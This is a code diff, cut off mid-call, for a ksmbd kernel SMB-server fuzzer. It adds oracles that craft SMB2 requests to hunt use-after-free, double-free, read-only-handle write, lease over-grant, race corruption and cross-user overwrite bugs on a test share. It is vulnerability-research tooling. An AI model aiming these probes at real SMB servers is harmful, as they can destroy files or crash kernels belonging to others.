-        _campaign.record_round(time.time() - t0, total_feat, len(seed_corpus), rnd)
-
-        # Phase 6 (per-round): auto-generated sniper harnesses + generic libFuzzer
+    def _flush_return_tokens(self):
+        """Write the harvested return values into the shared live dict every grain
+        in subsequent waves reads (`-dict=/tmp/ksmbdzzer_live.dict`). Each value is
+        emitted little-endian in whatever width holds it — the encoding it appears in
+        on the SMB2 wire — so libFuzzer can splice it directly into a field."""
+        if not self._ret_acc:
+            return
+        live = Path('/tmp/ksmbdzzer_live.dict')
         try:
-            import sys; sys.path.insert(0, str(SCRIPT_DIR))
-            from sniper import generate_all_snipers, run_snipers, should_regenerate, generate_discovery_snipers
+            existing = set(live.read_text().splitlines()) if live.exists() else set()
+        except OSError:
+            existing = set()
+        lines = list(existing)
+        added = 0
+        for v in sorted(self._ret_acc):
+            width = 4 if not (v >> 32) else 8
+            esc = "".join("\\x%02x" % c for c in v.to_bytes(width, "little"))
+            entry = 'ret_%d_%x="%s"' % (width, v, esc)
+            if entry not in existing:
+                lines.append(entry); existing.add(entry); added += 1
+        if added:
+            if len(lines) > 2000:                    # libFuzzer dislikes huge dicts
+                lines = lines[-2000:]
+            try:
+                live.write_text("\n".join(lines) + "\n")
+                print(f"  [redqueen] harvested {added} kernel return value(s) → live "
+                      f"dict ({len(lines)} tokens carried to next wave)", flush=True)
+            except OSError:
+                pass
 
-            # Generate snipers from value_pool (first round only — they persist)
-            if rnd == 1:
-                vpool_list = list(shared_vpool)
-                snipers = generate_all_snipers(vpool_list)
-                if snipers:
-                    print(f"  [snipers] generated {len(snipers)} targeted harnesses")
-                    # Seed persistent corpus with audit boundary values
-                    _seed_audit_corpus()
-            elif should_regenerate(list(shared_vpool)):
-                vpool_list = list(shared_vpool)
-                snipers = generate_all_snipers(vpool_list)
-                print(f"  [snipers] regenerated ({len(snipers)} harnesses, pool grew >2×)")
+    def _distill(self):
+        """ARBITER: distill this director's dataflow records + oracle interest into
+        the g_fb the C mutate_i2s() reads next round — closing the cross-round
+        data-driven loop (compile once, behavior from data). Writes FUZZDB/fb.bin.
 
-            # Write live dictionary (Phase 1-5 values → snipers reload per-run)
-            if snipers:
-                live_dict = Path('/tmp/ksmbdzzer_live.dict')
-                vpool_now = list(shared_vpool)[-200:]
-                with open(live_dict, 'w') as df:
-                    for v in set(vpool_now):
-                        if 0 < v < 0x100000000:
-                            df.write(f'"{struct.pack("<I", v & 0xFFFFFFFF).hex()}"\n')
-
-            # Filter snipers by target focus
-            target = getattr(args, 'target', 'all')
-            sniper_time = getattr(args, 'sniper_time', 3)
-            TARGET_MAP = {
-                'write': ['raw_write', 'read_after_write', 'dacl_setinfo', 'compound', 'mt_race'],
-                'race': ['mt_race', 'write_lock_race', 'compound'],
-                'dacl': ['dacl_setinfo', 'ea_alignment', 'create_ctx'],
-                'boundary': ['raw_write', 'read_after_write'],
-                'all': [],  # empty = no filter
-            }
-            if target != 'all' and snipers:
-                allowed = TARGET_MAP.get(target, [])
-                snipers = [(b, d) for b, d in snipers if any(a in b for a in allowed)]
-
-            # Run snipers (focused mutation on write-side patterns)
-            if snipers:
-                crashes = run_snipers(snipers, time_per=sniper_time)
-                if crashes:
-                    print(f"  !!! SNIPER CRASH: {crashes[0][0]} !!!")
-                    os.system("dmesg | tail -50 | grep -B1 -A10 'KASAN\\|ksmbd\\|UBSAN' | head -30")
-                    corpus_save(seed_corpus, global_features, list(shared_vpool))
-                    return
-
-            # Auto-generate discovery snipers from new (PC, arg) → ret=0 pairs
-            vpool_list = list(shared_vpool)
-            discoveries = [(v, v ^ 0x1000, 0) for v in vpool_list[-20:]
-                          if v > 0xffffffff80000000]  # kernel PCs only
-            if discoveries:
-                disc_snipers = generate_discovery_snipers(discoveries[:3], vpool_list)
-                if disc_snipers:
-                    print(f"  [discovery] +{len(disc_snipers)} auto-generated snipers from trace-args")
-                    run_snipers(disc_snipers, time_per=sniper_time)
-
+        hot offsets = the write-side CREATE/WRITE fields + any body offset the I2S
+        map tied to a kernel argument. values = the dangerous access/disp/option
+        combos the oracle cares about + boundaries + harvested kernel return values."""
+        hot = {24, 36, 40, 4, 8}          # CREATE access/disp/copts ; WRITE length/offset
+        try:
+            recs = self._records()
+            body = self._create_body("i2s_victim", 0x12019F, DISP_OPEN_IF,
+                                      FILE_NON_DIRECTORY_FILE)
+            for off in self._i2s_map(body, recs):
+                hot.add(off)
         except Exception:
-            snipers = []
+            pass
+        vals = set(self._ret_acc)
+        for access, disp, copts, _ in self.DANGEROUS:
+            vals.update((access, disp, copts))
+        vals.update((0, 1, 0x7fffffff, 0x80000000, 0xffffffff, WRITE_DESIRE_MASK,
+                     FILE_DELETE_ON_CLOSE, FILE_WRITE_DATA, FILE_DELETE, 0x02000000,
+                     112, 113, 0xffffffffffffffff))
+        nh, nv = write_feedback(hot, vals)
+        print(f"  [arbiter] distilled g_fb -> {nh} hot offsets + {nv} values "
+              f"(FUZZDB/fb.bin, host-durable) — steers next round's mutate_i2s",
+              flush=True)
 
-    # Save final corpus (includes libFuzzer discoveries)
-    corpus_save(seed_corpus, global_features, list(shared_vpool))
+    def _records(self):
+        n = self.lib.pfz_get_records(self._recbuf, 4096)
+        return [self._recbuf[i] for i in range(n)]
 
-    # Phase 7: Sharp analysis (binary search + race + anomaly report)
+    def _fid(self):
+        fb = ctypes.create_string_buffer(16)
+        return bytes(fb.raw[:16]) if self.lib.pfz_probe_get_fid(fb) == 0 else None
+
+    @staticmethod
+    def _create_body(name, access, disposition, coptions, share=0x7, fileattr=0x80):
+        nm = name.encode("utf-16-le")
+        b = bytearray(56 + len(nm))
+        struct.pack_into("<H", b, 0, 57)
+        struct.pack_into("<I", b, 24, access)
+        struct.pack_into("<I", b, 28, fileattr)
+        struct.pack_into("<I", b, 32, share)
+        struct.pack_into("<I", b, 36, disposition)
+        struct.pack_into("<I", b, 40, coptions)
+        struct.pack_into("<H", b, 44, 120)          # NameOffset (from SMB2 hdr)
+        struct.pack_into("<H", b, 46, len(nm))      # NameLength
+        b[56:56 + len(nm)] = nm
+        return bytes(b)
+
+    @staticmethod
+    def _close_body(fid):
+        b = bytearray(24)
+        struct.pack_into("<H", b, 0, 24)
+        b[8:24] = fid
+        return bytes(b)
+
+    @staticmethod
+    def _write_body(fid, offset, data):
+        b = bytearray(48 + len(data))
+        struct.pack_into("<H", b, 0, 49)
+        struct.pack_into("<H", b, 2, 112)           # DataOffset (from SMB2 hdr)
+        struct.pack_into("<I", b, 4, len(data))     # Length
+        struct.pack_into("<Q", b, 8, offset & 0xFFFFFFFFFFFFFFFF)
+        b[16:32] = fid
+        b[48:48 + len(data)] = data
+        return bytes(b)
+
+    # ---- input-to-state correspondence ---------------------------------------
+    def _i2s_map(self, body, recs):
+        """Input-to-state map for the oracle — delegates to the shared primitive
+        (single implementation, now also used by the live Phase 3 directed loop)."""
+        return i2s_correspondence(body, recs, self.tmap)
+
+    # ---- contract oracle ------------------------------------------------------
+    def _create_flag_calls(self, recs):
+        calls = {}
+        for r in recs:
+            if r.type != 0xE or self.tmap.whatis(r.pc) != "smb2_create_open_flags":
+                continue
+            c = calls.setdefault(r.seq, {})
+            v = r.vals[0] & 0xFFFFFFFF
+            if   r.arg_idx == 0: c["file_present"] = r.vals[0] & 1
+            elif r.arg_idx == 1: c["access"] = v
+            elif r.arg_idx == 2: c["disposition"] = v
+            elif r.arg_idx == 4: c["coptions"] = v
+        return list(calls.values())
+
+    @staticmethod
+    def _violations(access, disposition, coptions, file_present):
+        out = []
+        disp = disposition & 0x7
+        is_dir = bool(coptions & FILE_DIRECTORY_FILE)
+        if (file_present and not is_dir and disp in TRUNC_DISPOSITIONS
+                and not (access & WRITE_DESIRE_MASK)):
+            out.append(("OVERWRITE_WITHOUT_WRITE", "MS-SMB2 3.3.5.9",
+                        "O_TRUNC disposition granted without FILE_WRITE_DATA"))
+        if (coptions & FILE_DELETE_ON_CLOSE) and not (access & FILE_DELETE):
+            out.append(("DELETE_ON_CLOSE_WITHOUT_DELETE", "MS-SMB2 3.3.5.9",
+                        "DELETE_ON_CLOSE granted without DELETE access"))
+        return out
+
+    def _emit(self, kind, spec, detail, sent, body, status, recs):
+        # BLAKE2b of the exact bug-triggering PDU — the canonical identity for
+        # this finding (dedups distinct triggers even within the same kind).
+        bug_id = corpus_bug_id(kind, body)
+        if bug_id in _emitted_findings:
+            return
+        _emitted_findings.add(bug_id)
+        # dataflow provenance: did smb2_create_open_flags actually see these args?
+        observed = self._create_flag_calls(recs)
+        i2s = self._i2s_map(body, recs)
+        try:
+            FINDINGS_DIR.mkdir(parents=True, exist_ok=True)
+            rec = {
+                "kind": kind, "spec": spec, "detail": detail,
+                "blake2b": bug_id,
+                "ntstatus": f"0x{status:08x}", "succeeded": status == 0,
+                "share": "privtest", "worker_octet": self.octet,
+                "sent": {k: f"0x{v:08x}" for k, v in sent.items()},
+                "create_pdu_hex": body.hex(),
+                "dataflow_args_observed": [
+                    {k: f"0x{v:x}" for k, v in o.items()} for o in observed],
+                "i2s_input_to_state": [
+                    {"input_offset": off, "value": f"0x{v:x}", "width": w,
+                     "func": fn, "arg_idx": ai}
+                    for off, (v, w, fn, ai) in sorted(i2s.items())
+                    if fn == "smb2_create_open_flags"],
+                "symbolized": bool(self.tmap.ranges),
+            }
+            fn = FINDINGS_DIR / f"{kind.lower()}_{bug_id[:12]}.json"
+            fn.write_text(json.dumps(rec, indent=2))
+            print(f"  [ORACLE] {kind} ({spec}) — ksmbd returned "
+                  f"{'STATUS_SUCCESS' if status == 0 else hex(status)}; "
+                  f"reproducer → {fn}", flush=True)
+            if observed:
+                print(f"           dataflow proof: smb2_create_open_flags("
+                      f"access={rec['dataflow_args_observed'][0].get('access','?')}, "
+                      f"disposition={rec['dataflow_args_observed'][0].get('disposition','?')}, "
+                      f"coptions={rec['dataflow_args_observed'][0].get('coptions','?')})", flush=True)
+        except Exception as e:
+            print(f"  [ORACLE] emit failed: {e!r}", flush=True)
+
+    # ---- the always-on hunt ---------------------------------------------------
+    # (DesiredAccess, CreateDisposition, CreateOptions, label) — read-only handle
+    # combined with a write/delete-implying option. READ access = no write bit.
+    RO = FILE_READ_DATA | FILE_READ_ATTRIBUTES
+    DANGEROUS = [
+        (RO, DISP_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE, "overwrite_if_readonly"),
+        (RO, DISP_OVERWRITE,    FILE_NON_DIRECTORY_FILE, "overwrite_readonly"),
+        (RO, DISP_SUPERSEDE,    FILE_NON_DIRECTORY_FILE, "supersede_readonly"),
+        (RO, DISP_OPEN, FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, "doc_file_readonly"),
+        (RO, DISP_OPEN, FILE_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE,     "doc_dir_readonly"),
+    ]
+
+    def _positive_control(self, full):
+        """Positive control (#2): prove the oracle's detect→emit chain fires, so a
+        silent CREATE sweep means 'ksmbd correctly rejected', NOT 'oracle blind'.
+
+          (a) Predicate self-test — a known RO+OVERWRITE tuple MUST flag and a safe
+              read+write tuple MUST NOT; if either is wrong the detection logic is
+              broken and silence is meaningless.
+          (b) Live control — open the victim with FILE_READ_DATA only, then WRITE
+              through that handle. ksmbd MUST reject on the granted-access check; if
+              it ACCEPTS (status 0) that is a genuine LPE finding. Either outcome
+              exercises the full transport+records+emit path end to end.
+        """
+        ro = FILE_READ_DATA | FILE_READ_ATTRIBUTES
+        must_flag = self._violations(ro, DISP_OVERWRITE, FILE_NON_DIRECTORY_FILE,
+                                     file_present=1)
+        must_not = self._violations(FILE_READ_DATA | FILE_WRITE_DATA, DISP_OVERWRITE,
+                                    FILE_NON_DIRECTORY_FILE, file_present=1)
+        detect_ok = (any(k == "OVERWRITE_WITHOUT_WRITE" for k, _, _ in must_flag)
+                     and not must_not)
+        print(f"  [oracle] positive-control predicate self-test: "
+              f"{'PASS' if detect_ok else '!!! FAIL — detection logic broken, silence is meaningless'}",
+              flush=True)
+
+        # Pre-create the RO victim as owner so DISP_OPEN_IF finds/creates it, then
+        # reopen it with a read-only handle for the write-through test.
+        self._probe(0x0005, self._create_body("i2s_roctl", full, DISP_OPEN_IF,
+                                               FILE_NON_DIRECTORY_FILE))
+        seed = self._fid()
+        if seed:
+            self._probe(0x0006, self._close_body(seed))
+        self._probe(0x0005, self._create_body("i2s_roctl", ro, DISP_OPEN,
+                                               FILE_NON_DIRECTORY_FILE))
+        rfid = self._fid()
+        if not rfid:
+            print("  [oracle] positive-control: could not open read-only handle "
+                  "(skipped live control)", flush=True)
+            return
+        body = self._write_body(rfid, 0, b"RO-HANDLE-WRITE")
+        resp, status = self._probe(0x0009, body)
+        recs = self._records()
+        st = (status & 0xFFFFFFFF) if status is not None else 0xFFFFFFFF
+        accepted = status == 0
+        print(f"  [oracle] positive-control WRITE via read-only handle: "
+              f"NTSTATUS=0x{st:08x} "
+              f"{'ACCEPTED → CONTRACT VIOLATION' if accepted else 'rejected (correct)'}",
+              flush=True)
+        if accepted:
+            self._emit("WRITE_THROUGH_RO_HANDLE", "MS-SMB2 3.3.5.13",
+                       "WRITE succeeded on a handle opened with FILE_READ_DATA only "
+                       "(no FILE_WRITE_DATA) — granted access not honored",
+                       {"access": ro}, body, status, recs)
+        self._probe(0x0006, self._close_body(rfid))
+
+    # ---- SMB2 opcodes + READ helpers (used by the lifetime/lease/race oracles) --
+    _LOGOFF, _TREE_DISCONNECT = 0x0002, 0x0004
+    _CREATE, _CLOSE, _READ, _WRITE = 0x0005, 0x0006, 0x0008, 0x0009
+    _LEASE_R, _LEASE_H, _LEASE_W = 0x01, 0x02, 0x04   # MS-SMB2 2.2.13.2.8
+
+    @staticmethod
+    def _read_body(fid, offset, length):
+        b = bytearray(49)
+        struct.pack_into("<H", b, 0, 49)            # StructureSize
+        struct.pack_into("<I", b, 4, length)        # Length
+        struct.pack_into("<Q", b, 8, offset & 0xFFFFFFFFFFFFFFFF)
+        b[16:32] = fid
+        struct.pack_into("<I", b, 32, 1)            # MinimumCount
+        return bytes(b)
+
+    @staticmethod
+    def _read_payload(resp):
+        """Extract the data bytes from a READ response (DataOffset/DataLength are
+        SMB2-header-absolute). Bounds-checked; returns None on any inconsistency."""
+        try:
+            if resp is None or len(resp) < 64 + 16:
+                return None
+            doff = resp[64 + 2]                       # DataOffset (1 byte)
+            dlen = struct.unpack_from("<I", resp, 64 + 4)[0]
+            if doff == 0 or dlen == 0 or doff + dlen > len(resp):
+                return None
+            return resp[doff:doff + dlen]
+        except Exception:
+            return None
+
+    def _probe_reset(self, share=b"privtest"):
+        """Rebuild a clean authenticated session (used between destructive
+        sequences in the lifetime oracle). True on success."""
+        try:
+            return self.lib.pfz_probe_reconnect(share) == 0
+        except Exception:
+            return False
+
+    # ---- lifetime / use-after-teardown oracle (UAF hunt) ----------------------
+    def _teardown_oracle(self, full):
+        """Provoke use-after-free / stale-reference bugs in session & tree-connect
+        teardown — historically the highest-CVE-density area of ksmbd.
+
+        Each sequence opens a handle, destroys the object that owns it
+        (TREE_DISCONNECT frees the tree_conn; LOGOFF frees the session plus all its
+        trees+files), then USES the now-dangling FileId. Correct ksmbd rejects the
+        dangling op with an error NTSTATUS and never touches freed memory. Two
+        detectable failures:
+          * logic — the dangling op returns STATUS_SUCCESS (0): the object was
+            honored after teardown (emitted here);
+          * memory — a KASAN use-after-free / double-free splat on the serial
+            console (host-side grep), attributed by the BEGIN/END markers we print.
+        The session is rebuilt after every sequence.
+        """
+        print("  [uaf] session/tree teardown lifetime oracle", flush=True)
+        td = struct.pack("<HH", 4, 0)   # LOGOFF / TREE_DISCONNECT body (StructSize=4)
+        for label, teardown_cmd, obj in (
+                ("use_after_tree_disconnect", self._TREE_DISCONNECT, "tree_conn"),
+                ("use_after_logoff",          self._LOGOFF,          "session")):
+            if not self._probe_reset():
+                print(f"  [uaf] {label}: probe reconnect failed, skipping", flush=True)
+                continue
+            self._probe(self._CREATE, self._create_body(
+                "uaf_victim", full, DISP_OPEN_IF, FILE_NON_DIRECTORY_FILE))
+            fid = self._fid()
+            if not fid:
+                print(f"  [uaf] {label}: could not open victim handle, skipping", flush=True)
+                continue
+            print(f"  [uaf] --- BEGIN {label} (freeing {obj} with an open fid) ---", flush=True)
+            self._probe(teardown_cmd, td)
+            wresp, wst = self._probe(self._WRITE, self._write_body(fid, 0, b"UAF-DANGLING-WRITE"))
+            cresp, cst = self._probe(self._CLOSE, self._close_body(fid))
+            wsv = (wst & 0xFFFFFFFF) if wst is not None else 0xFFFFFFFF
+            csv = (cst & 0xFFFFFFFF) if cst is not None else 0xFFFFFFFF
+            conn_dead = (wresp is None and cresp is None)
+            print(f"  [uaf] --- END {label}: WRITE=0x{wsv:08x} CLOSE=0x{csv:08x}"
+                  f"{' CONN-DROPPED(possible crash)' if conn_dead else ''} ---", flush=True)
+            if wst == 0 or cst == 0:
+                recs = self._records()
+                which = "WRITE" if wst == 0 else "CLOSE"
+                self._emit("USE_AFTER_TEARDOWN", "MS-SMB2 3.3.5.6/3.3.5.7",
+                           f"{which} on a FileId succeeded after "
+                           f"{label.replace('use_after_', '').upper()} freed its {obj} — "
+                           f"stale handle honored (use-after-free / lifetime bug)",
+                           {"access": full},
+                           self._write_body(fid, 0, b"UAF-DANGLING-WRITE") if wst == 0
+                           else self._close_body(fid), wst if wst == 0 else cst, recs)
+        # double-teardown -> double-free candidates
+        for label, teardown_cmd in (("double_tree_disconnect", self._TREE_DISCONNECT),
+                                     ("double_logoff", self._LOGOFF)):
+            if not self._probe_reset():
+                continue
+            print(f"  [uaf] --- {label} (double teardown -> double-free candidate) ---", flush=True)
+            _, s1 = self._probe(teardown_cmd, td)
+            r2, s2 = self._probe(teardown_cmd, td)
+            s1v = (s1 & 0xFFFFFFFF) if s1 is not None else 0xFFFFFFFF
+            s2v = (s2 & 0xFFFFFFFF) if s2 is not None else 0xFFFFFFFF
+            print(f"  [uaf] {label}: first=0x{s1v:08x} second=0x{s2v:08x}"
+                  f"{' CONN-DROPPED(possible crash)' if r2 is None else ''}", flush=True)
+        self._probe_reset()   # leave a clean session behind
+
+    # ---- lease-grant contract oracle ------------------------------------------
+    def _lease_create_body(self, name, access, disp, copts, lease_key, lease_state):
+        """CREATE body (after the 64-byte SMB2 header) carrying a spec-correct v2
+        RqLs create context requesting @lease_state. Header-relative offsets are
+        absolute (name at 120); the context is 8-aligned after the name."""
+        nm = name.encode("utf-16-le")
+        NAME_ABS = 120
+        ctx_abs = (NAME_ABS + len(nm) + 7) & ~7
+        body_len = (ctx_abs - 64) + 76
+        b = bytearray(body_len)
+        struct.pack_into("<H", b, 0, 57)
+        struct.pack_into("<I", b, 24, access)
+        struct.pack_into("<I", b, 28, 0x80)          # FILE_ATTRIBUTE_NORMAL
+        struct.pack_into("<I", b, 32, 0x7)           # ShareAccess R|W|D
+        struct.pack_into("<I", b, 36, disp)
+        struct.pack_into("<I", b, 40, copts)
+        struct.pack_into("<H", b, 44, NAME_ABS)
+        struct.pack_into("<H", b, 46, len(nm))
+        struct.pack_into("<I", b, 48, ctx_abs)        # CreateContextsOffset (SMB2-abs)
+        struct.pack_into("<I", b, 52, 76)             # CreateContextsLength
+        b[56:56 + len(nm)] = nm
+        c = ctx_abs - 64                              # context start, body-relative
+        struct.pack_into("<I", b, c + 0, 0)           # Next
+        struct.pack_into("<H", b, c + 4, 16)          # NameOffset
+        struct.pack_into("<H", b, c + 6, 4)           # NameLength
+        struct.pack_into("<H", b, c + 8, 0)           # Reserved
+        struct.pack_into("<H", b, c + 10, 24)         # DataOffset
+        struct.pack_into("<I", b, c + 12, 52)         # DataLength (v2 lease)
+        b[c + 16:c + 20] = b"RqLs"
+        b[c + 24:c + 40] = lease_key
+        struct.pack_into("<I", b, c + 40, lease_state & 0x7)
+        return bytes(b)
+
+    @staticmethod
+    def _parse_granted_lease(resp):
+        """Granted LeaseState from a CREATE response's RqLs context, else None.
+        Every offset is bounds-checked; an absent/malformed context yields None."""
+        try:
+            if resp is None or len(resp) < 64 + 88:
+                return None
+            cco = struct.unpack_from("<I", resp, 64 + 80)[0]    # SMB2-abs
+            ccl = struct.unpack_from("<I", resp, 64 + 84)[0]
+            if cco == 0 or ccl == 0 or cco + 16 > len(resp):
+                return None
+            off = cco
+            for _ in range(8):
+                if off + 16 > len(resp):
+                    return None
+                nxt = struct.unpack_from("<I", resp, off)[0]
+                noff = struct.unpack_from("<H", resp, off + 4)[0]
+                nlen = struct.unpack_from("<H", resp, off + 6)[0]
+                doff = struct.unpack_from("<H", resp, off + 10)[0]
+                dlen = struct.unpack_from("<I", resp, off + 12)[0]
+                name = (resp[off + noff:off + noff + nlen]
+                        if off + noff + nlen <= len(resp) else b"")
+                if name == b"RqLs" and dlen >= 20 and off + doff + 20 <= len(resp):
+                    return struct.unpack_from("<I", resp, off + doff + 16)[0]
+                if nxt == 0:
+                    return None
+                off += nxt
+        except Exception:
+            return None
+        return None
+
+    @staticmethod
+    def _lease_str(x):
+        return "".join(c for c, bit in (("R", 1), ("H", 2), ("W", 4)) if x & bit) or "-"
+
+    def _lease_oracle(self, full):
+        """Lease-grant contract: the state ksmbd GRANTS must be a subset of what
+        was requested (MS-SMB2 3.3.5.9.11) and internally consistent (write-caching
+        implies read-caching). A granted bit that was not requested, or W-without-R,
+        is a lease-state-machine defect (stale-cache / data-corruption class)."""
+        if not self._probe_reset():
+            print("  [lease] probe reconnect failed, skipping", flush=True)
+            return
+        key = b"\xa1" * 16
+        self._probe(self._CREATE, self._create_body(
+            "lease_victim", full, DISP_OPEN_IF, FILE_NON_DIRECTORY_FILE))
+        f0 = self._fid()
+        if f0:
+            self._probe(self._CLOSE, self._close_body(f0))
+        for label, req in (("RWH", self._LEASE_R | self._LEASE_H | self._LEASE_W),
+                           ("RH",  self._LEASE_R | self._LEASE_H),
+                           ("R",   self._LEASE_R)):
+            body = self._lease_create_body("lease_victim", full, DISP_OPEN,
+                                           FILE_NON_DIRECTORY_FILE, key, req)
+            resp, status = self._probe(self._CREATE, body)
+            granted = self._parse_granted_lease(resp)
+            recs = self._records()
+            fid = self._fid()
+            if fid:
+                self._probe(self._CLOSE, self._close_body(fid))
+            stv = (status & 0xFFFFFFFF) if status is not None else 0xFFFFFFFF
+            if granted is None:
+                print(f"  [lease] request={label}: no lease granted / unparsable "
+                      f"(status=0x{stv:08x})", flush=True)
+                continue
+            extra = granted & ~req & 0x7
+            w_no_r = bool(granted & self._LEASE_W) and not (granted & self._LEASE_R)
+            print(f"  [lease] request={label}({self._lease_str(req)}) "
+                  f"granted={self._lease_str(granted)}"
+                  f"{' EXTRA=' + self._lease_str(extra) if extra else ''}"
+                  f"{' W-WITHOUT-R' if w_no_r else ''}", flush=True)
+            if extra or w_no_r:
+                detail = (f"ksmbd granted lease {self._lease_str(granted)} for a "
+                          f"{self._lease_str(req)} request"
+                          + (f"; extra bits {self._lease_str(extra)} never requested" if extra else "")
+                          + ("; write-caching without read-caching" if w_no_r else ""))
+                self._emit("LEASE_STATE_OVERGRANT", "MS-SMB2 3.3.5.9.11", detail,
+                           {"requested": req, "granted": granted}, body, status, recs)
+
+    # ---- race state-divergence oracle (fixes fire-and-forget races) -----------
+    def _race_integrity_oracle(self, full):
+        """A fire-and-forget race only surfaces bugs if it happens to crash. Add a
+        state-divergence check: write a known pattern, run a race that could tear
+        server-side file state, then read it back and compare. A silent mismatch =
+        the race corrupted state without a crash."""
+        if not self._probe_reset():
+            return
+        fname = "race_integrity"
+        pattern = bytes(((i * 7) & 0xFF) for i in range(256))
+        self._probe(self._CREATE, self._create_body(
+            fname, full, DISP_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE))
+        wfid = self._fid()
+        if not wfid:
+            return
+        self._probe(self._WRITE, self._write_body(wfid, 0, pattern))
+        self._probe(self._CLOSE, self._close_body(wfid))
+        # best-effort: drive a real oplock race across pool connections
+        try:
+            if self.lib.pfz_pool_init_authed(2) >= 0:
+                self.lib.pfz_pool_oplock_race(fname.encode())
+        except Exception:
+            pass
+        # read the pattern back through a fresh handle
+        self._probe_reset()
+        self._probe(self._CREATE, self._create_body(
+            fname, full, DISP_OPEN, FILE_NON_DIRECTORY_FILE))
+        rfid = self._fid()
+        if not rfid:
+            return
+        rb = self._read_body(rfid, 0, len(pattern))
+        resp, status = self._probe(self._READ, rb)
+        recs = self._records()
+        self._probe(self._CLOSE, self._close_body(rfid))
+        got = self._read_payload(resp)
+        if status == 0 and got is not None and got != pattern:
+            print(f"  [race] STATE DIVERGENCE: wrote {len(pattern)}B pattern, "
+                  f"read back {len(got)}B that differ", flush=True)
+            self._emit("RACE_STATE_DIVERGENCE", "MS-SMB2 3.3.5.9",
+                       f"file content diverged after an oplock race: wrote "
+                       f"{len(pattern)} bytes of a known pattern, read back "
+                       f"{len(got)} differing bytes without a crash",
+                       {"len": len(pattern)}, rb, status, recs)
+        else:
+            print("  [race] integrity check: content stable after race", flush=True)
+
+    # ---- fragmented-framing pass (fixes loopback-only short-read coverage) -----
+    def _frag_pass(self, full):
+        """Re-issue a CREATE/WRITE/CLOSE cycle with the PDU split across TCP
+        segments (pfz_probe_send_frag) so ksmbd_tcp_readv()'s partial-read loop —
+        which a single loopback write() coalesces away — actually runs."""
+        if not self._probe_reset():
+            return
+        buf = ctypes.create_string_buffer(8192)
+        body = self._create_body("frag_victim", full, DISP_OPEN_IF, FILE_NON_DIRECTORY_FILE)
+        try:
+            r = self.lib.pfz_probe_send_frag(self._CREATE, body, len(body), buf, 8192, 8)
+        except Exception as e:
+            print(f"  [frag] send_frag unavailable ({e!r})", flush=True)
+            return
+        st = int.from_bytes(buf.raw[8:12], "little") if r >= 12 else 0xFFFFFFFF
+        fid = self._fid()
+        if fid:
+            wb = self._write_body(fid, 0, b"FRAGMENTED-WRITE")
+            self.lib.pfz_probe_send_frag(self._WRITE, wb, len(wb), buf, 8192, 6)
+            self._probe(self._CLOSE, self._close_body(fid))
+        print(f"  [frag] segmented CREATE reassembled by ksmbd_tcp_readv: "
+              f"NTSTATUS=0x{st & 0xFFFFFFFF:08x} "
+              f"{'(conn survived)' if r >= 12 else '(CONN-DROPPED — check console)'}",
+              flush=True)
+
+    def _cross_user_oracle(self):
+        """REAL write-side LPE oracle (#39) — replaces the owner-on-own-file check,
+        which can only ever emit false positives (findings/TRIAGE-contract-oracle.md).
+        The victim is owned by root (uid 0); on [privtest] ksmbd maps `fuzz` to a
+        non-root uid (65535/nobody — no system `fuzz` user), so POSIX genuinely
+        denies write/delete. Violations are judged by EFFECT on the backing FS
+        (data destroyed / file unlinked), NOT by status==0 — ksmbd can return
+        SUCCESS while POSIX silently prevents the destructive effect (e.g. the
+        create-path O_TRUNC is a no-op). A real hit means ksmbd bypassed POSIX
+        (acted as root, or skipped a check) = genuine integrity/LPE bug."""
+        import pathlib
+        PRIV = pathlib.Path("/tmp/ksmbd_priv")
+        xdir, victim = PRIV / "xu", PRIV / "xu" / "rov"
+        SECRET = b"PRECIOUS_XUSER_DATA"
+
+        def _plant():
+            xdir.mkdir(exist_ok=True)
+            victim.write_bytes(SECRET)
+            os.chown(victim, 0, 0); os.chmod(victim, 0o644)
+            os.chown(xdir, 0, 0); os.chmod(xdir, 0o755)
+
+        try:
+            _plant()
+        except Exception as e:
+            print(f"  [xuser] setup failed ({e!r}) — cross-user oracle skipped "
+                  f"(needs root in guest)", flush=True)
+            return
+
+        # Sanity: confirm fuzz is a non-root uid on [privtest]; else the POSIX gate
+        # is a no-op and a 'violation' would be inconclusive.
+        self._probe(self._CREATE, self._create_body(
+            "xu_uidcheck", 0x12019F, DISP_OPEN_IF, FILE_NON_DIRECTORY_FILE))
+        f = self._fid()
+        if f:
+            self._probe(self._CLOSE, self._close_body(f))
+        pf = PRIV / "xu_uidcheck"
+        fuzz_uid = pf.stat().st_uid if pf.exists() else -1
+        if fuzz_uid == 0:
+            print("  [xuser] fuzz maps to uid 0 on [privtest] — POSIX cannot "
+                  "distinguish it; cross-user oracle inconclusive, skipping", flush=True)
+            return
+        print(f"  [xuser] victim root:root 0644 (parent 0755), fuzz→uid {fuzz_uid} "
+              f"(non-root) — POSIX gate active; judging by EFFECT", flush=True)
+
+        def _check(kind, spec, detail, body, st, gone_or_changed, ok_msg):
+            st = (st & 0xFFFFFFFF) if st is not None else 0xFFFFFFFF
+            if gone_or_changed:
+                print(f"  [xuser] !!! REAL VIOLATION: {kind} as uid {fuzz_uid} "
+                      f"(NTSTATUS=0x{st:08x})", flush=True)
+                self._emit(kind, spec, detail,
+                           {"access": self.RO, "uid": fuzz_uid}, body, st,
+                           self._records())
+            else:
+                print(f"  [xuser] {ok_msg} (NTSTATUS=0x{st:08x}) — correct", flush=True)
+
+        # (1) OVERWRITE: read-only handle + truncating disposition.
+        body = self._create_body("xu\\rov", self.RO, DISP_OVERWRITE_IF,
+                                 FILE_NON_DIRECTORY_FILE)
+        _, st = self._probe(self._CREATE, body)
+        f = self._fid()
+        if f:
+            self._probe(self._CLOSE, self._close_body(f))
+        after = victim.read_bytes() if victim.exists() else b""
+        _check("XUSER_OVERWRITE_WITHOUT_WRITE", "MS-SMB2 3.3.5.9 / POSIX",
+               "read-only handle truncated a root-owned 0644 file", body, st,
+               after != SECRET, "overwrite: root data intact")
+        try: _plant()
+        except Exception: pass
+
+        # (2) DELETE_ON_CLOSE: read-only handle, parent dir unwritable to fuzz.
+        body = self._create_body("xu\\rov", self.RO, DISP_OPEN,
+                                 FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE)
+        _, st = self._probe(self._CREATE, body)
+        f = self._fid()
+        if f:
+            self._probe(self._CLOSE, self._close_body(f))
+        _check("XUSER_DELETE_WITHOUT_PERMISSION", "MS-SMB2 3.3.5.9 / POSIX",
